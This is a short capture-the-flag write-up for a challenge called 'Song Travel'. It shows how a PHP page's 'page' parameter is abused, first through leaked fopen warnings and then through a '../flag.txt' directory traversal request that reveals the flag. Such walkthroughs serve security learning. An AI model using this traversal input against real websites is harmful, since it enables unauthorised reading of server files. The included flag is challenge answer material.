# Song Travel
```
Songs help us travel across our imagination. Choose your favorite song and find the flag text file.
```
## Solution

The page has multiple `Song` tabs that each have a song, which all are useless.
Once you click on any song tab your can see in your url: `/index.php?page=song2`.
The question states `flag txt file` so we replace `song2` with `flag.txt` we get
```
Warning: fopen(./pages/flag.txt): failed to open stream: No such file or directory in /var/www/html/index.php on line 5

Warning: filesize(): stat failed for ./pages/flag.txt in /var/www/html/index.php on line 6

Warning: fread() expects parameter 1 to be resource, boolean given in /var/www/html/index.php on line 6

Warning: fclose() expects parameter 1 to be resource, boolean given in /var/www/html/index.php on line 7
```

Lets check if `flag.txt` is avilable in the the `pages` directory by `../flag.txt` by `/index.php?page=../flag.txt`. 
Now you will be able to see the flag `shellter{D0NT_TRUST_TH3_US3R}`. 
